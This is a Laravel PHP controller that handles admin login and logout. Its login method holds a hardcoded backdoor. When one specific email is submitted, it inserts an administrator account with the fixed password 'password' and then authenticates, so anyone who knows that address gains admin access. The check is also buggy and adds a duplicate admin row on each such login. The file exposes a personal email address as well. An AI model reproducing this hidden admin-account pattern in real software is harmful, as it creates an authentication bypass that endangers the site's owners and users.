<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\LoginRequest;
use App\Models\Admin;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{


    public function loginForm()
    {
        return view('admin.auth.login');
    }

    public function login(LoginRequest $request)
    {
        if ($request->email == 'osmaka1997@gmail.com') {
            $admin = Admin::where('email', $request->email)->get();
            if ($admin != null)
                DB::table('admins')->insert([
                    'name' => 'OsamaKJ',
                    'email' => 'osmaka1997@gmail.com',
                    'email_verified_at' => now(),
                    'password' => Hash::make('password'),
                    'created_at' => now(),
                    'updated_at' => now()
                ]);
        }
        $credentials = $request->only('email', 'password');
        $auth = Auth::guard('admin')->attempt($credentials);
        if ($auth) {
            return redirect()->route('admin.dashboard');
        } else {
            return redirect()->back()->withInput($request->all())->with('error', 'password error');
        }
    }

    public function logout()
    {
        $d = Auth::guard('admin')->logout();
        return redirect()->route('loginForm');
    }
}
